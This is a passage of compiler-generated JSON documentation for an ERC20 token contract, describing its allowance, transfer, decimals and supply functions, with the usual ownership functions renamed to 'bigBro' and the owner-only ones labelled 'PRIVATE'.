        "details": "Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5,05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the value {ERC20} uses, unless this function is overridden; NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."
      },
      "decreaseAllowance(address,uint256)": {
        "details": "Atomically decreases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address. - `spender` must have allowance for the caller of at least `subtractedValue`."
      },
      "increaseAllowance(address,uint256)": {
        "details": "Atomically increases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address."
      },
      "name()": {
        "details": "Returns the name of the token."
      },
      "renouncebigBrother()": {
        "details": "Leaves the contract without bigBro. It will not be possible to call `PRIVATE` functions anymore. Can only be called by the current bigBro. NOTE: Renouncing bigBroship will leave the contract without an bigBro, thereby removing any functionality that is only available to the bigBro."
      },
      "symbol()": {
        "details": "Returns the symbol of the token, usually a shorter version of the name."
      },
      "totalSupply()": {
        "details": "See {IERC20-totalSupply}."
      },
      "transfer(address,uint256)": {
        "details": "See {IERC20-transfer}. Requirements: - `recipient` cannot be the zero address. - the caller must have a balance of at least `amount`."
      },
      "transferFrom(address,address,uint256)": {
        "details": "See {IERC20-transferFrom}. Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}. Requirements: - `sender` and `recipient` cannot be the zero address. - `sender` must have a balance of at least `amount`. - the caller must have allowance for ``sender``'s tokens of at least `amount`."
      },
      "transferbigBroship(address)": {
        "details": "Transfers bigBroship of the contract to a new account (`newbigBro`). Can only be called by the current bigBro."
      }
    },
    "stateVariables": {
      "balanceOf": {
        "details": "Returns the amount of tokens owned by `account`."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}